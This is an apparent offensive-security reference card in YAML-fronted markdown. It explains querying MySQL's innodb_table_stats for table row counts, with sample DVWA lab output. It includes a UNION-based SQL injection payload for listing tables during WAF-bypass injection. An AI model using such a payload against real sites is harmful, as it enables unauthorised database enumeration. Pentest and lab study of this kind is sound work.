---
id: 831c83e1-3ae0-4b38-b5e0-540445f94348
name: MySQL Select InnoDB Table Stats
type: command
executor: sql
data: SELECT * FROM mysql.innodb_table_stats
output: null
created_at: '2023-04-06T03:56:36.832477+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - mysql
  - enumeration
verified: true
validated: true
---

# MySQL Select InnoDB Table Stats

## Command

```sql
SELECT * FROM mysql.innodb_table_stats;
```

## Description

This command retrieves statistics on InnoDB tables, including row counts and index sizes, useful for assessing data volume in WAF bypass SQLi scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| database_name | Filter by database (optional) | No |
| table_name | Filter by table (optional) | No |

## Examples

### Basic Usage

```sql
SELECT database_name, table_name, n_rows FROM mysql.innodb_table_stats WHERE database_name = 'dvwa';
```

### In Injection Context

```sql
' UNION SELECT CONCAT(table_name, ':', n_rows) FROM mysql.innodb_table_stats--
```

## Expected Output

+----------------+-----------------+--------+
| database_name  | table_name      | n_rows |
+----------------+-----------------+--------+
| dvwa           | users           | 5      |
| dvwa           | guestbook       | 0      |
+----------------+-----------------+--------+

## Related

- [[procedures/SQL Injection WAF Bypass using MySQL Specific Commands]]
- [[MySQL Select Information Schema Tables]]
